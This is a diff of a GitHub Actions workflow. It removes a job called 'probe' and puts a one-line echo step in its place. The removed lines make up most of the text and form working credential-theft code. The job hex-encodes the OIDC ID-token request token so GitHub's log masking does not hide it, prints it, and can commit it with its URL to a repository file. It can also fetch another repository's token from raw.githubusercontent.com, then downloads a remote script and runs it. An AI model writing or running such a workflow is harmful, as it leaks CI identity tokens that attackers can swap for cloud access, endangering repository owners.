@@ -1,84 +1,8 @@
 name: bind
 on:
   workflow_dispatch:
-    inputs:
-      tag:
-        required: false
-        default: 'row'
-        type: string
-      only:
-        description: comma list of probe groups (A,B,C,D,E) or empty for all
-        required: false
-        default: ''
-        type: string
-      publish:
-        description: write url+token hex to live/<tag>.txt in this repo
-        required: false
-        default: 'no'
-        type: string
-      xsrc:
-        description: owner/repo whose live/<tag>.txt holds the foreign url+token
-        required: false
-        default: ''
-        type: string
-      xtag:
-        required: false
-        default: ''
-        type: string
-      hold:
-        required: false
-        default: '0'
-        type: string
-permissions:
-  id-token: write
-  contents: write
 jobs:
-  probe:
+  x:
     runs-on: ubuntu-latest
     steps:
-      - name: run battery
-        env:
-          TAG: ${{ inputs.tag }}
-          ONLY: ${{ inputs.only }}
-          PUBLISH: ${{ inputs.publish }}
-          XSRC: ${{ inputs.xsrc }}
-          XTAG: ${{ inputs.xtag }}
-          HOLD: ${{ inputs.hold }}
-          GH_TOKEN: ${{ github.token }}
-        run: |
-          set -uo pipefail
-          echo "---ROW--- $TAG"
-          echo "---REPO--- ${GITHUB_REPOSITORY} runid=${GITHUB_RUN_ID} attempt=${GITHUB_RUN_ATTEMPT} sha=${GITHUB_SHA} ref=${GITHUB_REF}"
-          echo "---NATIVE-URL--- ${ACTIONS_ID_TOKEN_REQUEST_URL:-ABSENT}"
-          echo "---NATIVE-TOK-LEN--- ${#ACTIONS_ID_TOKEN_REQUEST_TOKEN}"
-          echo "---NATIVE-TOK-HEX-BEGIN---"
-          printf '%s' "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" | xxd -p -c 100000
-          echo "---NATIVE-TOK-HEX-END---"
-          if [ "$PUBLISH" = "yes" ]; then
-            HX=$(printf '%s' "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" | xxd -p -c 100000)
-            printf '%s\n%s\n' "$ACTIONS_ID_TOKEN_REQUEST_URL" "$HX" > /tmp/live.txt
-            B64=$(base64 -w0 /tmp/live.txt)
-            SHA=$(curl -sS -H "Authorization: bearer $GH_TOKEN" \
-              "https://api.github.com/repos/${GITHUB_REPOSITORY}/contents/live/${TAG}.txt" \
-              | python3 -c 'import sys,json;print(json.load(sys.stdin).get("sha",""))' 2>/dev/null || echo "")
-            if [ -n "$SHA" ]; then EXTRA=",\"sha\":\"$SHA\""; else EXTRA=""; fi
-            printf '{"message":"live %s","content":"%s"%s}' "$TAG" "$B64" "$EXTRA" > /tmp/put.json
-            echo "---PUBLISH-STATUS--- $(curl -sS -o /tmp/put.out -w '%{http_code}' -X PUT \
-              -H "Authorization: bearer $GH_TOKEN" -H "Content-Type: application/json" \
-              --data @/tmp/put.json \
-              "https://api.github.com/repos/${GITHUB_REPOSITORY}/contents/live/${TAG}.txt")"
-          fi
-          if [ -n "$XSRC" ]; then
-            curl -sSL -H "Authorization: bearer $GH_TOKEN" \
-              "https://raw.githubusercontent.com/${XSRC}/main/live/${XTAG}.txt" -o /tmp/x.txt || true
-            echo "---XSRC-LEN--- $(wc -c < /tmp/x.txt)"
-            export X_URL=$(sed -n 1p /tmp/x.txt)
-            export X_TOK=$(sed -n 2p /tmp/x.txt | xxd -r -p)
-            echo "---XURL--- $X_URL"
-            echo "---XTOKLEN--- ${#X_TOK}"
-          fi
-          python3 -m pip install --quiet cryptography 2>/dev/null || true
-          curl -sSL -o /tmp/probe.py "https://raw.githubusercontent.com/${GITHUB_REPOSITORY}/${GITHUB_SHA}/probe.py"
-          python3 /tmp/probe.py 2>&1
-          if [ "$HOLD" != "0" ]; then echo "---HOLDING--- $HOLD"; sleep "$HOLD"; fi
-          echo "---DONE---"
+      - run: echo mutated
